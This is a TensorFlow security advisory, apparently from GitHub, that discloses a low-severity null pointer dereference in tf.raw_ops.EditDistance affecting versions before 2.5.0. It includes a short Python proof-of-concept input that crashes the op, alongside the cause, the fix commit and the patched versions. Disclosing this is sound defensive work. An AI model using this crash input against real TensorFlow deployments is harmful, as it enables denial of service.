# Null pointer dereference in `EditDistance`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-75f6-78jr-4656
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

An attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`:

```
import tensorflow as tf

hypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)
hypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)
hypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)
truth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)
truth_values = tf.constant([], shape=[0], dtype=tf.float32)
truth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)

tf.raw_ops.EditDistance(
    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,
    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,
    truth_values=truth_values, truth_shape=truth_shape, normalize=True)
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/79865b542f9ffdc9caeb255631f7c56f1d4b6517/tensorflow/core/kernels/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.

In the above scenario, an attacker causes an allocation of an empty tensor for the output:

```
OP_REQUIRES_OK(ctx, ctx->allocate_output("output", output_shape, &output));
auto output_t = output->flat<float>();
output_t.setZero();
```

Because `output_shape` has 0 elements, the result of `output->flat<T>()` has an empty buffer, so calling `setZero` would result in a null dereference.

### Patches

We have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https://github.com/tensorflow/tensorflow/commit/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.
